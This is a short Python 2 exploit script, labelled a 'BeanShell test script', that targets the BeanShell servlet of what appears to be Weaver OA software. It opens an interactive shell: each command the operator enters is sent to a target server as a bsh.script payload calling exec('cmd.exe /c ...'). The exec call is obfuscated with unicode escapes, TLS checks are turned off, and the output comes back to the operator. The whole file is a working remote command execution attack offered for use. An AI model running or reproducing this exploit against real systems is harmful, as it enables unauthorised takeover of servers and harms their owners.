#import urllib3
#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests, sys

print '''
--------------------------------------
BeanShell test script by LuckyEast >_< 
--------------------------------------
'''

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'Content-Length': '578'
}

url = '/weaver/bsh.servlet.BshServlet'


def test(target):
    while 1:

        cmd = raw_input('\n>>>Command= ')
        if cmd == 'exit':
            break
        else:
            test_url = target + url
            poc = 'bsh.script=\u0065\u0078\u0065\u0063("cmd.exe /c %s");&bsh.servlet.output=raw'% cmd
            rsp = requests.post(url=test_url, data=poc, headers=headers, verify=False, timeout=5)
            text = rsp.text
            print text

if __name__ == "__main__":
    target = sys.argv[1]
    test(target)
